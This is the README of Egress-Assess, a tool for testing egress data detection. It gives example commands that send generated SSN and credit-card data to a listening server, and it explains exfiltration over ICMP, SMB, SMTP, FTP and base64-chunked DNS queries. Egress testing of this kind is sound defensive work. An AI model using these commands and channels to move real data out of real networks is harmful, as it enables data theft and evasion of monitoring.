Egress-Assess
=============

Egress-Assess is a tool used to test egress data detection capabilities.

Setup
=====

To setup, run the included setup script, or perform the following:

1.  Install pyftpdlib
2.  Generate a server certificate and store it as "server.pem" on the same level as Egress-Assess.  This can be done with the following command:

`openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes`

We highly recommend using Debian as your server of choice! If you need to use Ubuntu, we would recommend to use 16.04 due to port 53 being in use by default on 18.04.

Usage
=====

Blog posts are available here: 

* https://www.christophertruncer.com/egress-assess-testing-egress-data-detection-capabilities/
* https://www.christophertruncer.com/egress-assess-action-via-powershell/

Typical use case for Egress-Assess is to copy this tool in two locations.  One location will act as the server, the other will act as the client.  Egress-Assess can send data over FTP, HTTP, and HTTPS.

To extract data over FTP, you would first start Egress-Assess’s FTP server by selecting “--server ftp” and providing a username and password to use:

`./Egress-Assess.py --server ftp --username testuser --password pass123`

Now, to have the client connect and send data to the FTP server, you could run...

`./Egress-Assess.py --client ftp --username testuser --password pass123 --ip 192.168.63.149 --datatype ssn`

Also, you can setup Egress-Assess to act as a web server by running....

`./Egress-Assess.py --server https`

Then, to send data to the FTP server, and to specifically send 15 megs of credit card data, run the following command...

`./Egress-Assess.py --client https --data-size 15 --ip 192.168.63.149 --datatype cc`

Other things of note:
- dns_complete is an improved version of the DNS Server module. Using DNSLib, this module can listen and respond to requests from both TXT and A records, decode the requests utilizing the correct format, and write the output to a file.
- SMB has an option for SMB2 support or not. Newer Windows10 systems typically have SMBv1 disabled. For this reason SMBv2 is the default, you can use the switch to disable SMBv2.


How the Protocols Attempt Exfil
-----
- SMTP - The client creates a mail message placing the data in the body of the message or if a file, as an attachment. The client then attempts to make a SMTP connection to the EgressAssess Server over port 25 (or an alternate port provided). The SMTP server does not require authentication and accepts the incoming connection and processes the email. The processing of the mail message takes the data from the body of the email or from the attached file in the mail message. This test does not attempt to send the email through the organizations email server.

- SMTP_Outlook – (This module is only available in the PowerShell client). If an Outlook client has been previously configured, the PowerShell client creates a COM Object to Outlook (This may require a user to provide authentication depending on the configuration). The PowerShell client then will create a mail message with the data in the body of the email or if a file, as an attachment. Emails are sent from Outlook as the previously configured user. (Some security settings may notify the user that a program is trying to send emails in the background and needs to select allow). For this module to work a MX record needs to be created for the EgressAssess Server. The EgressAssess SMTP server accepts all email messages sent to the domain of the MX record and receives the email with the file attachments or the data as test in out the body of the email. 
`Invoke-EssessAgress -Client SMTPOutlook -IP <domain of SMTP Sever> -NoPing -DataType "ssn"`

- ICMP - The data is broken up into bytes and base64 encoded and sent over the wire in an ICMP Type 8 ECHO request. the data is placed inside the data field of the packet. The ECHO requests are continuously made to the EgressAsess Server which receives the ICMP request and gathers the data and decodes it. 

- FTP - Data and files are upload to the EgressAssess FTP server following typical protocol usage. A username and password are used to access the server. See examples above.

- SFTP - Data and files are uploaded following the SFTP protocol. A username and password are used to access the server.

- HTTP(S) - Data and files are sent via a POST web request to the EgressAssess web server. For the Python client, the data is posted to http(s)://<IP or FQDN>/post_data.php and for the PowerShell Client the data is posted to http(s)://<IP or FQDN>/posh_file.php.

- SMB - The EgressAssess Server (using Impacket's SimpleSMBserver) creates a /TRANSFER SMB Share. The client system connects to the share with no authentication and transfers the file. Just like connecting to a network share and copying a file over. There is the option to add a username and password for authentication as well if desired. As noted above, determine which system you are egressing from and their security policies to see if you can use the old vulnerable SMBv1 or need to enable SMBv2

- DNS_TXT - Data and files are broken up into bytes and then converted to base64 and chunked into separate DNS TXT queries that are made at an IP address or Domain Name. The client attempts to connect directly to the EgressAssess Server and makes the DNS TXT query. The Server then filters the data out of the packets and decodes the data. In the PowerShell Client there is an option for Stacked queries. This will make up to 7 TXT queries in each DNS request at the server which increases the speed at which the data is exfilled.

- DNS_Resolved - Data and files are broken up into bytes and then converted to base64. The data is then chunked up and used as a part of a DNS request to resolve a subdomain. <encoded_data>.domain.com. For this to work an NS record for the domain needs to be setup for the EgressAssess server. All of the DNS requests are made to the systems set nameserver and ultimately reach the EgressAssess server that was previously setup. The EgressAssess server takes the data section from each request and puts the file back together.


